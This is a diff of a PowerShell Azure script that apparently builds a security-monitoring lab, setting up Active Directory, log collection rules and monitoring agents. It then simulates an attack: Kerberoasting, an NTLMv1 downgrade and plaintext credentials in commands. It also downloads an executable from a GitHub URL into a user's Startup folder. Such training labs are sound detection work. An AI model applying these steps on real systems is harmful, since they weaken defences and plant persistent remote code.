@@ -8,32 +8,16 @@ param (
 Import-Module Az.Compute
 Import-Module Az.Accounts
 Import-Module Az.Monitor
+
 Connect-AzAccount -Identity
+
+
+$resourceGroupName = "ITOperations"
 $DCvmName = "DC"
-$resourceGroupName = "CyberSOC"
-$resourceGroupNameOps = "ITOperations"
-$workspaceName = "CyberSOCWS"
-$dcrName = "Minimal-Servers"
-$powershellDcrName = "PowerShellLogs"
-$linuxDcrName = "Minimal-Linux"
-$DCDcrName = "Additional-DC"
-$web01Name = "web01"
-$mservName = "mserv"
-$vmNames = @("mserv", "win10", "dc")
-# Get the resource group location
-$resourceGroup = Get-AzResourceGroup -Name $resourceGroupName
-$location = $resourceGroup.Location
-$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName $resourceGroupName -Name $workspaceName
-# Prepare DCR details
-$workspaceResourceId = $workspace.ResourceId
-$workspaceId = $workspace.CustomerId
 
 
-#######################################
-# Step 1. Promote a domain controller
-#######################################
-Write-Output "Initiating Step 1..."
-$djoinScript = @"
+# PowerShell Script to Run
+$script = @"
 # Ensure the required Windows feature is installed
 Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
 
@@ -48,33 +32,15 @@ Import-Module ADDSDeployment
 Install-ADDSForest -DomainName `$domainName -SafeModeAdministratorPassword `$safeModePassword -Force
 "@
 
-Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupNameOps -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $djoinScript
-
-Write-Output "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Step 2 tasks completed successfully!"
-#######################################
-# Step 1 ends here
-#######################################
-
-#######################################################
-# Step 2.
-# - Setting up Bastion
-# - Onboarding web01, win10 and mserv to relevant DCRs
-# - Installing AMA for web01, win10, mserv
-#######################################################
-Write-Output "Initiating Step 2..."
+# Invoke Run Command
+Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $script
 
 
 
-# Full script for Bastion server configuration
-$SetupBastionScript = {
-    #param($inheritedContext)
-    #Set-AzContext -Context $inheritedContext
-    $resourceGroupNameOps = "ITOperations"
-    $bastionName = "bastion-gw01"
+#Scheduling autolog generator on bastion-gw01
+$bastionName = "bastion-gw01"
 
-    
-
-    $BastionSimScript = @"
+$BastionSimScript = @"
 import os
 import time
 from random import choice, randint
@@ -178,8 +144,8 @@ if __name__ == "__main__":
     generate_system_alerts()
 "@
 
-    # Bash command to create and run the Python script
-    $BastionCommand = @"
+# Bash command to create and run the Python script
+$BastionCommand = @"
 #!/bin/bash
 cat << 'EOF' > /tmp/simscript.py
 $BastionSimScript
@@ -187,34 +153,63 @@ EOF
 (crontab -l; echo "*/2 * * * * python3 /tmp/simscript.py >> /tmp/runlog.log 2>&1") | crontab -
 "@
 
-    Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupNameOps -VMName $bastionName -CommandId "RunShellScript" -ScriptString $BastionCommand
+
+# Execute the command on the Linux VM
+Write-Output "Executing script on the Linux VM bastion-gw01..."
+try {
+    $result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName `
+                                    -VMName $bastionName `
+                                    -CommandId "RunShellScript" `
+                                    -ScriptString $BastionCommand
+
+    if ($result) {
+        Write-Output "Command executed successfully. Output:"
+        $result.Value[0].Message | Write-Output
+    } else {
+        Write-Output "Command execution failed or returned no output."
+    }
+} catch {
+    Write-Error "Failed to execute command: $_"
 }
 
 
-# Full Script for creating all DCRs and adding all the associations
-$DCRsScript = {
-    #param($inheritedContext)
-    #Set-AzContext -Context $inheritedContext
-    $resourceGroupName = "CyberSOC"
-    $resourceGroupNameOps = "ITOperations"
-    $workspaceName = "CyberSOCWS"
-    $dcrName = "Minimal-Servers"
-    $powershellDcrName = "PowerShellLogs"
-    $linuxDcrName = "Minimal-Linux"
-    $DCDcrName = "Additional-DC"
-    $DCvmName = "DC"
-    $web01Name = "web01"
-    $win10name="win10"
-    $vmNames = @("mserv", "win10", "dc")
-    # Get the resource group location
-    $resourceGroup = Get-AzResourceGroup -Name $resourceGroupName
-    $location = $resourceGroup.Location
-    $workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName $resourceGroupName -Name $workspaceName
-    # Prepare DCR details
-    $workspaceResourceId = $workspace.ResourceId
-    $workspaceId = $workspace.CustomerId
 
-    $jsonContent = @"
+# Start DCR onboarding
+
+
+# Variables
+$resourceGroupName = "CyberSOC"
+$workspaceName = "CyberSOCWS"
+$dcrName = "Minimal-Servers"
+$powershellDcrName = "PowerShellLogs"
+$linuxDcrName = "Minimal-Linux"
+$DCDcrName = "Additional-DC"
+
+# Get the resource group location
+$resourceGroup = Get-AzResourceGroup -Name $resourceGroupName
+if (!$resourceGroup) {
+    Write-Output "Resource group '$resourceGroupName' not found." -ForegroundColor Red
+    exit
+}
+
+$location = $resourceGroup.Location
+
+# Retrieve the Log Analytics Workspace details
+$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName $resourceGroupName -Name $workspaceName
+if (!$workspace) {
+    Write-Output "Log Analytics Workspace '$workspaceName' not found in Resource Group '$resourceGroupName'" -ForegroundColor Red
+    exit
+}
+
+# Prepare DCR details
+$workspaceResourceId = $workspace.ResourceId
+$workspaceId = $workspace.CustomerId
+#$subscriptionId=(Get-AzContext).Subscription.Id
+
+# Define the DCR object
+# Construct JSON as a raw string
+# Construct JSON as a raw string (without apiVersion)
+$jsonContent = @"
 {
     "kind": "Windows",
     "location": "$location",
@@ -264,7 +259,8 @@ $DCRsScript = {
 }
 "@
 
-    $powershellDCRJsonContent = @"
+# Define the JSON content 
+$powershellDCRJsonContent = @"
 {
     "kind": "Windows",
     "location": "$location",
@@ -308,7 +304,7 @@ $DCRsScript = {
 }
 "@
 
-    $linuxJsonContent = @"
+$linuxJsonContent = @"
 {
     "kind": "Linux",
     "location": "$location",
@@ -381,7 +377,8 @@ $DCRsScript = {
 }
 "@
 
-    $dcJsonContent = @"
+
+$dcJsonContent= @"
 {
     "kind": "Windows",
     "location": "$location",
@@ -426,111 +423,135 @@ $DCRsScript = {
 }
 "@
 
-    New-AzDataCollectionRule -Name $dcrName -ResourceGroupName $resourceGroupName -JsonString $jsonContent
-    New-AzDataCollectionRule -Name $powershellDcrName -ResourceGroupName $resourceGroupName -JsonString $powershellDCRJsonContent
-    New-AzDataCollectionRule -Name $linuxDcrName -ResourceGroupName $resourceGroupName -JsonString $linuxJsonContent
-    New-AzDataCollectionRule -Name $DCDcrName -ResourceGroupName $resourceGroupName -JsonString $dcJsonContent
 
+# Create the Data Collection Rule using the JSON string 
+New-AzDataCollectionRule -Name $dcrName -ResourceGroupName $resourceGroupName -JsonString $jsonContent
 
-    # DC Association
-    $DCdcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $DCDcrName
-    $dataCollectionRuleId = $DCdcr.Id
-    $DCvm = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $DCvmName
-    $targetResourceId = $DCvm.Id
-    $associationName = "$DCvmName-DCR-Association-addt"
-    New-AzDataCollectionRuleAssociation -TargetResourceId $targetResourceId -DataCollectionRuleId $dataCollectionRuleId -AssociationName $associationName
+# Add DCR association to VMs
+$vmNames = @("mserv", "win10", "dc")
 
-    # Web01 association
-    $linuxDcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $linuxDcrName
-    $linuxDataCollectionRuleId = $linuxDcr.Id
-    $web01 = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $web01Name
-    $targetLinuxResourceId = $web01.Id
-    $LinuxassociationName = "web01-DCR-Association"
-    New-AzDataCollectionRuleAssociation -TargetResourceId $targetLinuxResourceId -DataCollectionRuleId $linuxDataCollectionRuleId -AssociationName $LinuxassociationName
+# Retrieve the ImmutableId for the DCR
+$dcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $dcrName
+if (!$dcr) {
+    Write-Output "DCR '$dcrName' not found in Resource Group '$resourceGroupName'." -ForegroundColor Red
+    exit
+}
 
-    # Win10 powershell DCR association
-    $powershellDCR = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $powershellDcrName
-    $powershellDataCollectionRuleId = $powershellDCR.Id
-    $win10 = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $win10name
-    $targetWin10ResourceId = $win10.Id
-    $Win10PowershellassociationName = "Powershell-win10-DCR-Association"
-    New-AzDataCollectionRuleAssociation -TargetResourceId $targetWin10ResourceId -DataCollectionRuleId $powershellDataCollectionRuleId -AssociationName $Win10PowershellassociationName
+$dataCollectionRuleId = $dcr.Id
+$resourceGroupNameOps = "ITOperations"
 
-    # Server DCR association for multiple VMS
-    $dcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $dcrName
-    $dataCollectionRuleId = $dcr.Id
-    foreach ($vmName in $vmNames) {
-        $vm = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $vmName
-        $targetResourceId = $vm.Id
-        $associationName = "$vmName-DCR-Association"
-        New-AzDataCollectionRuleAssociation -TargetResourceId $targetResourceId -DataCollectionRuleId $dataCollectionRuleId -AssociationName $associationName
+# Add DCR association to VMs
+foreach ($vmName in $vmNames) {
+    $vm = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $vmName
+    if (!$vm) {
+        Write-Output "VM '$vmName' not found in Resource Group '$resourceGroupNameOps'." 
+        continue
     }
+
+    # Build the association
+    $targetResourceId = $vm.Id
+    $associationName = "$vmName-DCR-Association"
+
+    # Create DCR association
+    New-AzDataCollectionRuleAssociation -TargetResourceId $targetResourceId `
+        -DataCollectionRuleId $dataCollectionRuleId `
+        -AssociationName $associationName
+
+    Write-Output "DCR Association '$associationName' created for VM '$vmName' using Id."
 }
 
 
-# Full script for AMA onbording
-$AMAOnboardingScript = {
-    #param($inheritedContext)
-    #Set-AzContext -Context $inheritedContext
-    $vmNames = @("mserv", "win10", "dc")
-    $resourceGroupName = "CyberSOC"
-    $resourceGroupNameOps = "ITOperations"
-    $web01Name = "web01"
-    $vmNames = @("mserv", "win10", "dc")
-    # Get the resource group location
-    $resourceGroup = Get-AzResourceGroup -Name $resourceGroupName
-    $location = $resourceGroup.Location
+# Windows 10 Powershell DCR
+New-AzDataCollectionRule -Name $powershellDcrName -ResourceGroupName $resourceGroupName -JsonString $powershellDCRJsonContent
+$win10name="win10"
 
 
-    foreach ($vmName in $vmNames) {
-        # Enable the Azure Monitor extension for Windows VMs
-        Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps `
-            -VMName $vmName `
-            -Name "AzureMonitorWindowsAgent" `
-            -Publisher "Microsoft.Azure.Monitor" `
-            -ExtensionType "AzureMonitorWindowsAgent" `
-            -TypeHandlerVersion "1.0" `
-            -Location $location
-    
-        Write-Output "Azure Monitor Agent deployed for VM '$vmName'." 
-    }
-    # Deploy Azure Monitor Agent to the Linux VM
-    Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps -VMName $web01Name -Name "AzureMonitorLinuxAgent" -Publisher "Microsoft.Azure.Monitor"     -ExtensionType "AzureMonitorLinuxAgent"     -TypeHandlerVersion "1.0"     -Location $location
-    Write-Output "Azure Monitor Agent deployed for VM '$web01Name'." 
+# Retrieve the ImmutableId for the DCR
+$powershellDCR = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $powershellDcrName
+if (!$powershellDCR) {
+    Write-Output "DCR '$powershellDcrName' not found in Resource Group '$resourceGroupName'." 
 }
 
-#$ctx = Get-AzContext
-# Start parallel jobs
-#Start-Job -Name "SetupBastion" -ScriptBlock $SetupBastionScript -ArgumentList $ctx
-#Start-Job -Name "SetupDCRs" -ScriptBlock $DCRsScript -ArgumentList $ctx
-#Start-Job -Name "AMAOnboarding" -ScriptBlock $AMAOnboardingScript -ArgumentList $ctx
-$SetupBastionScript.Invoke()
-$DCRsScript.Invoke()
-$AMAOnboardingScript.Invoke()
-
-#Get-Job | Wait-Job
-#Get-Job | ForEach-Object {
-#    "=== JOB: $($_.Name) ==="
-#    Receive-Job $_ -Keep
-#    "========================`n"
-#}
+$powershellDataCollectionRuleId = $powershellDCR.Id
 
 
-Write-Output "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Step 2 tasks completed successfully!"
+# Add Powershell DCR association to Win10 VMs
+$win10 = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $win10name
+if (!$win10) {
+    Write-Output "VM '$win10name' not found in Resource Group '$resourceGroupNameOps'." 
+}
+
+# Build the association
+$targetWin10ResourceId = $win10.Id
+$Win10PowershellassociationName = "Powershell-win10-DCR-Association"
+# Create DCR association
+New-AzDataCollectionRuleAssociation -TargetResourceId $targetWin10ResourceId -DataCollectionRuleId $powershellDataCollectionRuleId -AssociationName $Win10PowershellassociationName
+
+Write-Output "DCR Association '$Win10PowershellassociationName' created for VM '$win10name' using Id." 
 
 
-#######################################
-# Step 2 ends here
-#######################################
 
 
-########################################################################
-# Step 3.
-# - Joining win10 and mserv to domain
-# Unless machines are successfully joined, the domain is non-operational
-# end the script can't proceed
-#########################################################################
-Write-Output "Initiating Step 3..."
+# -----------------------------------------
+# - Deploy Azure Monitor Agent to the VMs -
+# -----------------------------------------
+foreach ($vmName in $vmNames) {
+    # Enable the Azure Monitor extension
+    $extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps `
+        -VMName $vmName `
+        -Name "AzureMonitorWindowsAgent" `
+        -Publisher "Microsoft.Azure.Monitor" `
+        -ExtensionType "AzureMonitorWindowsAgent" `
+        -TypeHandlerVersion "1.0" `
+        -Location $location
+
+    Write-Output "Azure Monitor Agent deployed for VM '$vmName'." 
+}
+
+
+
+# -----------------------------------------
+# ----    Linux DCR part      -------------
+# -----------------------------------------
+
+New-AzDataCollectionRule -Name $linuxDcrName -ResourceGroupName $resourceGroupName -JsonString $linuxJsonContent
+
+# Add DCR association to VMs
+$web01Name = "web01"
+
+
+# Retrieve the ImmutableId for the DCR
+$linuxDcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $linuxDcrName
+if (!$linuxDcr) {
+    Write-Output "DCR '$linuxDcrName' not found in Resource Group '$resourceGroupName'." 
+}
+
+$linuxDataCollectionRuleId = $linuxDcr.Id
+
+
+# Add DCR association to VMs
+$web01 = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $web01Name
+if (!$web01) {
+    Write-Output "VM '$web01Name' not found in Resource Group '$resourceGroupNameOps'." 
+}
+
+# Build the association
+$targetLinuxResourceId = $web01.Id
+$LinuxassociationName = "web01-DCR-Association"
+# Create DCR association
+New-AzDataCollectionRuleAssociation -TargetResourceId $targetLinuxResourceId -DataCollectionRuleId $linuxDataCollectionRuleId -AssociationName $LinuxassociationName
+Write-Output "DCR Association '$LinuxassociationName' created for VM '$web01Name' using Id." 
+
+
+# Deploy Azure Monitor Agent to the Linux VM
+$extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps -VMName $web01Name -Name "AzureMonitorLinuxAgent" -Publisher "Microsoft.Azure.Monitor"     -ExtensionType "AzureMonitorLinuxAgent"     -TypeHandlerVersion "1.0"     -Location $location
+Write-Output "Azure Monitor Agent deployed for VM '$web01Name'." 
+
+
+
+# Join machines to domain
+
+
 $resourceGroupName = "ITOperations"
 $domainName = "odomain.local"
 $domainAdminUser = $adminAccount
@@ -611,20 +632,21 @@ foreach ($vmName in $vmNames) {
     Invoke-DomainJoinWithRetry -ResourceGroupName $resourceGroupName -VMName $vmName -Script $domainJoinScript
 }
 
-Write-Output "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Step 3 tasks completed successfully!"
+# Post-reboot Script to Configure DNS Forwarders
+$dnsForwarderScript = @"
+# Ensure DNS Server module is available
+Import-Module DNSServer
 
-#######################################
-# Step 3 ends here
-#######################################
+# Add a forwarder to Google Public DNS
+Add-DnsServerForwarder -IPAddress "8.8.8.8"
+"@
+
+# Run the DNS forwarder configuration script on the DC VM
+Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $dnsForwarderScript
 
 
-########################################################################
-# Step 4.
-# - Configuring DNS on DC
-# - Creating domain objects
-#########################################################################
-Write-Output "Initiating Step 4..."
 
+# Populate AD
 
 $ADOnjectsCreationScript = @"
 param (
@@ -633,11 +655,6 @@ param (
 
 # Import the Active Directory module
 Import-Module ActiveDirectory
-# Ensure DNS Server module is available
-Import-Module DNSServer
-
-# Add a forwarder to Google Public DNS
-Add-DnsServerForwarder -IPAddress "8.8.8.8"
 
 
 # Define global variables
@@ -751,7 +768,60 @@ foreach (`$computer in `$ComputerAccounts) {
 }
 
 Write-Output "Active Directory environment setup with OU structure completed successfully."
+"@
 
+
+# Run object creation script on the DC VM
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $ADOnjectsCreationScript -Parameter @{"pwd" = $adminPassword}
+
+# View the full output of provisioning
+$output.Value | ForEach-Object { $_.Message }
+
+
+#Add DCRs to DC
+
+# Create the Data Collection Rule using the JSON string 
+New-AzDataCollectionRule -Name $DCDcrName -ResourceGroupName $resourceGroupName -JsonString $dcJsonContent
+
+
+# Retrieve the ImmutableId for the DCR
+$DCdcr = Get-AzDataCollectionRule -ResourceGroupName $resourceGroupName -Name $DCDcrName
+if (!$DCdcr) {
+    Write-Output "DCR '$DCDcrName' not found in Resource Group '$resourceGroupName'." 
+    exit
+}
+
+$dataCollectionRuleId = $DCdcr.Id
+$resourceGroupNameOps = "ITOperations"
+
+# Add DCR association to VMs
+$DCvm = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $DCvmName
+if (!$DCvm) {
+    Write-Output "VM '$DCvmName' not found in Resource Group '$resourceGroupNameOps'." 
+}
+
+# Build the association
+$targetResourceId = $DCvm.Id
+$associationName = "$DCvmName-DCR-Association-addt"
+
+    # Create DCR association
+New-AzDataCollectionRuleAssociation -TargetResourceId $targetResourceId `
+    -DataCollectionRuleId $dataCollectionRuleId `
+    -AssociationName $associationName
+
+Write-Output "DCR Association '$associationName' created for VM '$DCvmName' using Id."
+
+$extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps `
+        -VMName $DCvmName `
+        -Name "AzureMonitorWindowsAgent" `
+        -Publisher "Microsoft.Azure.Monitor" `
+        -ExtensionType "AzureMonitorWindowsAgent" `
+        -TypeHandlerVersion "1.0" `
+        -Location $location
+
+Write-Output "Azure Monitor Agent deployed for VM '$DCvmName'." 
+
+$EnableAuditScriptString = @"
 Write-Output "Enabling LDAP Diagnostics Settings..."
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" -Name "16 LDAP Interface Events" -Value 2 -Type DWord
 
@@ -820,36 +890,21 @@ New-SmbShare @ShareParams -FullAccess "Administrator" -ReadAccess "Everyone"
 Write-Output "Share '`$ShareName' created and shared with 'Everyone' for read access."
 
 "@
+# Enable LDAP Audit on DC VM
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $EnableAuditScriptString 
 
-
-# Run object creation script on the DC VM
-$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $ADOnjectsCreationScript -Parameter @{"pwd" = $adminPassword}
-
-# View the full output of provisioning
+# View the full output
 $output.Value | ForEach-Object { $_.Message }
 
 
-Write-Output "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Step 4 tasks completed successfully!"
 
-#######################################
-# Step 4 ends here
-#######################################
+##################################################################
+##### Web01 setup packages and simulate candice logon for win10
+# Final stage of the attack
+# LDAP Simple Bind, Kerberosting, Lateral Movement to mserv, AD compromise
 
-
-########################################################################
-# Step 5.
-# - Configure web01 and initiate Win10 profile creation
-# - Configuring mserv auditing and downgrading NTLM
-# accessing a file share and starting a service
-#########################################################################
-
-Write-Output "Initiating Step 5..."
-
-# Define ScriptBlock for the Python script execution on web01
-$Web01ScriptBlock = {
-    param($rgName, $adminPwd, $vmName)
-
-    $PythonScript = @"
+# Python script to execute on the Linux VM 
+$PythonScript = @"
 from ldap3 import Server, Connection, ALL, SIMPLE
 
 def connect_to_ad(server_address, user, password):
@@ -873,15 +928,18 @@ def connect_to_ad(server_address, user, password):
             conn.unbind()
 
 AD_SERVER = 'ldap://10.0.0.4'
-AD_USER1 = 'ODOMAIN\\\\LDAPUserAccount1'
-AD_USER2 = 'ODOMAIN\\\\LDAPUserAccount2'
-AD_PASSWORD = '$adminPwd'
+AD_USER1 = 'ODOMAIN\\\\$LDAPUserAccount1'
+AD_USER2 = 'ODOMAIN\\\\$LDAPUserAccount2'
+AD_PASSWORD = '$adminPassword'
 
 connect_to_ad(AD_SERVER, AD_USER1, AD_PASSWORD)
 connect_to_ad(AD_SERVER, AD_USER2, AD_PASSWORD)
 "@
 
-    $Command = @"
+#Write-Output $PythonScript
+
+# Bash command to create and run the Python script
+$Command = @"
 #!/bin/bash
 sudo apt-get update -y
 sudo apt-get install -y python3-pip python3-venv freerdp2-x11 xvfb
@@ -895,19 +953,20 @@ Xvfb :99 -screen 0 1024x768x16 &
 sleep 30
 su - adm0 -c 'whoami'
 su - adm0 -c 'DISPLAY=:99 xfreerdp --version'
-su - adm0 -c 'DISPLAY=:99 timeout 90 xfreerdp /v:10.0.0.6 /u:adm0 /p:'$adminPwd' /dynamic-resolution /cert:ignore &'
+su - adm0 -c 'DISPLAY=:99 timeout 90 xfreerdp /v:10.0.0.6 /u:adm0 /p:'$adminPassword' /dynamic-resolution /cert:ignore &'
 python3 /tmp/temp_script.py
-sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPwd' -request
+sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
 "@
 
-    Invoke-AzVMRunCommand -ResourceGroupName $rgName -VMName $vmName -CommandId "RunShellScript" -ScriptString $Command
-}
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $web01Name -CommandId "RunShellScript" -ScriptString $Command 
+# View the full output
+$output.Value | ForEach-Object { $_.Message }
 
-# Define ScriptBlock for the NTLM setup on mserv
-$MservScriptBlock = {
-    param($rgName, $adminPwd, $vmName)
 
-    $mservscript = @"
+##################################################################
+
+#Downgrade to NTLM and access DC file share under an account with NTLM
+$mservscript = @"
 # Enable File and Printer sharing
 netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
 # Add ssupport to local admins
@@ -941,21 +1000,184 @@ Set-ItemProperty -Path `$regPath -Name `$regValue -Value 1
 Write-Output "LAN Manager Authentication Level downgraded to NTLMv1 successfully."
 
 `$FileSharePath = "\\10.0.0.4\HealthReports"
-`$securePassword = ConvertTo-SecureString "$adminPwd" -AsPlainText -Force
+`$securePassword = ConvertTo-SecureString "$adminPassword" -AsPlainText -Force
 `$Credential = New-Object System.Management.Automation.PSCredential ("odomain\reportAdmin", `$securePassword)
 
 # Directly access the file share with the specified credentials
 `$session = New-PSDrive -Name TempShare -PSProvider FileSystem -Root `$FileSharePath -Credential `$Credential
 try {
-    Get-ChildItem -Path "TempShare:\" 
+    Get-ChildItem -Path "TempShare:\"
 } finally {
     Remove-PSDrive -Name TempShare
 }
 
+#Start-Process powershell.exe -Credential `$Credential -ArgumentList "-Command Get-ChildItem -Path `$FileSharePath; Start-Sleep -Seconds 1;Exit"
+Write-Output "Accessed a folder under reportAdmin account, with downgraded NTLM."
+"@
+# Connect with NTLMv1
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "mserv" -CommandId "RunPowerShellScript" -ScriptString $mservscript 
+
+# View the full output
+$output.Value | ForEach-Object { $_.Message }
+
+
+
+## Logon users to win10, setting audit
+$w10script = @"
+Write-Output "Setting Advanced Audit Policies..."
+# Logon/Logoff
+& auditpol.exe /set /subcategory:"Logon" /success:enable /failure:enable
+& auditpol.exe /set /subcategory:"Logoff" /success:disable
+& auditpol.exe /set /subcategory:"Special Logon" /success:enable /failure:enable
+
+# Detailed tracking
+& auditpol.exe /set /subcategory:"Process Creation" /success:enable /failure:enable
+
+# Privilege use
+& auditpol.exe /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
+
+Write-Output "Enabling scriptblock logging..."
+New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -force
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
+
+gpupdate /force
+
+Write-Output "Adding users to Local Admins..."
+net localgroup Administrators "ODOMAIN\candice.kevin" /add
+net localgroup Administrators "ODOMAIN\ssupport" /add
+
+
+
+
+Write-Output "Creating profiles for candice.kevin and ssupport...."
+# Define domain users and their profile paths
+`$users = `@(
+    `@{
+        UserName = "ODOMAIN\candice.kevin"
+        ProfilePath = "C:\Users\candice.kevin"
+    },
+    `@{
+        UserName = "ODOMAIN\ssupport"
+        ProfilePath = "C:\Users\ssupport"
+    }
+)
+
+# Define the default profile path
+`$defaultProfile = "C:\Users\Default"
+
+# Function to get the user's SID
+function Get-UserSID {
+    param (
+        [string]`$UserName
+    )
+    `$user = New-Object System.Security.Principal.NTAccount(`$UserName)
+    `$sid = `$user.Translate([System.Security.Principal.SecurityIdentifier])
+    return `$sid.Value
+}
+
+# Function to set registry profile information
+function Set-RegistryProfile {
+    param (
+        [string]`$SID,
+        [string]`$ProfilePath
+    )
+    `$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\`$SID"
+    if (!(Test-Path `$regPath)) {
+        New-Item -Path `$regPath -Force | Out-Null
+    }
+    Set-ItemProperty -Path `$regPath -Name "ProfileImagePath" -Value `$ProfilePath
+    Set-ItemProperty -Path `$regPath -Name "Flags" -Value 0
+    Set-ItemProperty -Path `$regPath -Name "State" -Value 0
+}
+
+# Iterate over each user
+foreach (`$user in `$users) {
+    `$userName = `$user.UserName
+    `$profilePath = `$user.ProfilePath
+
+    Write-Output "Processing user: `$userName"
+    Write-Output "Profile Path: '`$profilePath'"
+
+    # 1. Copy the Default Profile
+    if (!(Test-Path `$profilePath)) {
+        Write-Output "Copying Default Profile to `$profilePath..."
+        #`$robocopyCommand = "robocopy `$defaultProfile `$profilePath /MIR /SEC /XJ /XD 'Application Data'"
+        #Invoke-Expression `$robocopyCommand
+        Start-Process -FilePath "robocopy" -ArgumentList "`$defaultProfile `$profilePath /MIR /SEC /XJ /XD 'Application Data'" -Wait -NoNewWindow
+    } else {
+        Write-Output "Profile already exists at `$profilePath."
+    }
+
+    # 2. Get the User's SID
+    `$sid = Get-UserSID -UserName `$userName
+    Write-Output "User SID for `$userName : `$sid"
+
+    # 3. Set the Profile Path in the Registry
+    Write-Output "Setting registry for profile..."
+    Set-RegistryProfile -SID `$sid -ProfilePath `$profilePath
+
+    # 4. Set Permissions for the User
+    Write-Output "Setting permissions for `$userName on `$profilePath..."
+    `$acl = Get-Acl `$profilePath
+    `$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
+        `$userName, "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow"
+    )
+    `$acl.SetAccessRule(`$accessRule)
+    Set-Acl -Path `$profilePath -AclObject `$acl
+
+    Write-Output "Profile setup complete for `$userName."
+}
+
+write-output "Force creating Startup Folder and Downloading directly to the Startup folder..."
+`$DownloadUrl = "https://github.com/secpfe/FundyLabs/raw/refs/heads/main/rs.exe"
+`$startupFolder = "C:\users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+New-Item -ItemType Directory -Path `$startupFolder -Force
+`$destination = `$startupFolder + "\rs.exe"
+Invoke-WebRequest -Uri `$DownloadUrl -OutFile `$destination
+write-output "Done downloading!"
+
+schtasks /create /tn "RunCMD" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "$adminPassword"
+schtasks /run /tn "RunCMD"
+schtasks /create /tn "RunCMD2" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\ssupport" /rp "$adminPassword"
+schtasks /run /tn "RunCMD2"
+
+Write-Output "All profiles created successfully!"
+
+"@
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script 
+
+# View the full output
+$output.Value | ForEach-Object { $_.Message }
+
+
+
+
+
+
+
+
+#Acess DC file share under an account with NTLMv1
+$mservscript = @"
+`$FileSharePath = "\\10.0.0.4\HealthReports"
+`$securePassword = ConvertTo-SecureString "$adminPassword" -AsPlainText -Force
+`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\reportAdmin", `$securePassword)
+
+
+# Directly access the file share with the specified credentials
+`$session = New-PSDrive -Name TempShare -PSProvider FileSystem -Root `$FileSharePath -Credential `$Credential
+try {
+    Get-ChildItem -Path "TempShare:\"
+} finally {
+    Remove-PSDrive -Name TempShare
+}
+
+#Start-Process powershell.exe -Credential `$Credential -ArgumentList "-Command Get-ChildItem -Path `$FileSharePath; Start-Sleep -Seconds 1;Exit"
 Write-Output "Accessed a folder under reportAdmin account, with downgraded NTLM."
 
+
+
 # Create the service using sc.exe
-`$command = "sc.exe create BackupSVC binPath= c:\backup\backup.exe obj= odomain\da-batch password= $adminPwd start= auto"
+`$command = "sc.exe create BackupSVC binPath= c:\backup\backup.exe obj= odomain\da-batch password= $adminPassword start= auto"
 Invoke-Expression `$command
 
 
